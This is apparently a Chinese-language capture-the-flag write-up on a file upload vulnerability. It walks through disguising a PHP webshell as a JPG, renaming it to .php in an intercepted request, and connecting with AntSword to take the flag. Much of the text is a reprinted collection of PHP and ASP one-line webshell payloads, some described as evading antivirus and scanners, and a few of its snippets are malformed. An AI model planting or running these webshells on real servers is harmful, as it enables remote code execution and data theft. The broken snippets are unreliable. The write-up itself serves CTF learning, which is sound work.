# Backgroud

## 文件上传漏洞

+ 对于web文件上传的一些漏洞，这里就不赘述啦，[文件上传漏洞总结](https://blog.csdn.net/weixin_59872639/article/details/123077019)

## 上传个jpg抓包试试

+ 随便上传一张图片（题目要求为username_str.jpg形式上传），我们发现文件路径/uploads/Qyang_lux.jpg

  [![xvMu0s.md.png](https://s1.ax1x.com/2022/11/07/xvMu0s.md.png)](https://imgse.com/i/xvMu0s)

  所以理清思路：***我们需要将我们的一句话木马成功上传并在网页访问它，成功执行里面的代码，并蚁剑连接获取网页源数据***；

+ BP抓包看看有上传的信息：***POST方式、filename就是我们的文件名、类型为image图片型***

  [![xvMycD.md.png](https://s1.ax1x.com/2022/11/07/xvMycD.md.png)](https://imgse.com/i/xvMycD)

  常见的媒体格式类型如下：转载[HTTP content-type | 菜鸟教程 (runoob.com)](https://www.runoob.com/http/http-content-type.html)

  ``````
  text/html ： HTML格式
  text/plain ：纯文本格式
  text/xml ： XML格式
  image/gif ：gif图片格式
  image/jpeg ：jpg图片格式
  image/png：png图片格式
  
  以application开头的媒体格式类型：
  
  application/xhtml+xml ：XHTML格式
  application/xml： XML数据格式
  application/atom+xml ：Atom XML聚合格式
  application/json： JSON数据格式
  application/pdf：pdf格式
  application/msword ： Word文档格式
  application/octet-stream ： 二进制流数据（如常见的文件下载）
  application/x-www-form-urlencoded ： <form encType=””>中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式）
  
  另外一种常见的媒体格式是上传文件之时使用的：
  
  multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式
  ``````

## 伪造一个jpg文件试试

+ 创建一个txt文件写入`<?=eval($_POST=['cmd']);?>`，保存并把文件名改为jpg尝试上传；

  [![xvQFb9.png](https://s1.ax1x.com/2022/11/07/xvQFb9.png)](https://imgse.com/i/xvQFb9)

  上传被拒绝了，***说明eval肯定被网页给过滤掉了***；

  我们换个语句`<?php  //?cmd=phpinfo(); $func =create_function('',$_REQUEST['cmd']); $func(); ?>`再试试，没有alert说明上传成功啦！！；

  常用的PHP一句话木马，转载[Fasthand_文件上传漏洞](https://blog.csdn.net/qq_43390703/article/details/104858705)

  ``````
  <?php @eval($_POST['r00ts']);?> 
  
  <?php phpinfo();?>
  
  <?php @eval($_POST[cmd]);?>
  
  <?php @eval($_REQUEST[cmd]);?>
  
  <?php assert($_REQUEST[cmd]); ?>
  
  <?php //?cmd=phpinfo() @preg_replace("/abc/e",$_REQUEST['cmd'],"abcd"); ?>
  
  <?php 
  $func =create_function('',$_REQUEST['cmd']);
  $func();
  ?>
  
  <?php
  //?func=system&cmd=whoami
  $func=$_GET['func'];
  $cmd=$_GET['cmd'];
  $array[0]=$cmd;
  $new_array=array_map($func,$array);
  //print_r($new_array);
  ?>
  
  <?php 
  //?cmd=phpinfo()
  @call_user_func(assert,$_GET['cmd']);
  ?>
  
  <?php 
  //?cmd=phpinfo()
  $cmd=$_GET['cmd'];
  $array[0]=$cmd;
  call_user_func_array("assert",$array);
  ?>
  
  <?php 
  //?func=system&cmd=whoami
  $cmd=$_GET['cmd'];
  $array1=array($cmd);
  $func =$_GET['func'];
  array_filter($array1,$func);
  ?>
  
  <?php usort($_GET,'asse'.'rt');?> php环境>=<5.6才能用
  
  <?php usort(...$_GET);?>  php环境>=5.6才能用
  
  <?php eval($_POST1);?> 
  
  <?php if(isset($_POST['c'])){eval($_POST['c']);}?> 
  
  <?php system($_REQUEST1);?> 
  
  <?php ($_=@$_GET1).@$_($_POST1)?> 
  
  <?php eval_r($_POST1)?> 
  
  <?php @eval_r($_POST1)?>//容错代码 
  
  <?php assert($_POST1);?>//使用Lanker一句话客户端的专家模式执行相关的PHP语句 
  
  <?$_POST['c']($_POST['cc']);?> 
  
  <?$_POST['c']($_POST['cc'],$_POST['cc'])?> 
  
  <?php @preg_replace("/[email]/e",$_POST['h'],"error");?>/*使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入*/:<O>h=@eval_r($_POST1);</O> 
  
  <?php echo `$_GET['r']` ?> 
  
  
  <script language="php">@eval_r($_POST[sb])</script> //绕过<?限制的一句话
  
  <?php (])?>   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！
  
  <?if(isset($_POST['1'])){eval($_POST['1']);}?><?php system ($_REQUEST[1]);?> 
  加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！
  
  <%execute request(“class”)%><%'<% loop <%:%><%'<% loop <%:%><%execute request (“class”)%><%execute request(“class”)'<% loop <%:%> 
  无防下载表，有防下载表可尝试插入以下语句突破的一句话 
  
  <%eval(request(“1″)):response.end%> 备份专用
  
  
  ``````

  

## 将jpg文件伪造成php文件上传

+ 前面我们成功上传了自己构造的”jpg文件“，但是***网页是无法把jpg文件当成php文件解析的***；

  [![xvQxZd.md.png](https://s1.ax1x.com/2022/11/07/xvQxZd.md.png)](https://imgse.com/i/xvQxZd)

+ BP抓包上传过程，将Qyang_3.jpg改为Qyang_3.php上传，为了显式告知我们php代码能成功执行，我们在末尾加一句`echo "successful!"`；

  [![xvlzXF.md.png](https://s1.ax1x.com/2022/11/07/xvlzXF.md.png)](https://imgse.com/i/xvlzXF)

+ 访问/uploads/Qyang_3.php执行代码，看到***successful！***说明上传成功了；

  [![xv1wAs.png](https://s1.ax1x.com/2022/11/07/xv1wAs.png)](https://imgse.com/i/xv1wAs)

+ 直接蚁剑连接一下，连接成功！整个网页的全部数据尽入囊中；

  [中国蚁剑的下载与基本使用](https://zhuanlan.zhihu.com/p/537053564)（测试连接若发现”返回数据为空“/”Error...“多半是没有上传成功或url错了）

  [![xv16jU.md.png](https://s1.ax1x.com/2022/11/07/xv16jU.md.png)](https://imgse.com/i/xv16jU)

  找一下flag发现就在wwwroot文件夹下；

  [![xv1fE9.png](https://s1.ax1x.com/2022/11/07/xv1fE9.png)](https://imgse.com/i/xv1fE9)

  flag：***flag{ohh3hhh_y5u_h3ve_d0ne_a_g00d_jo3}***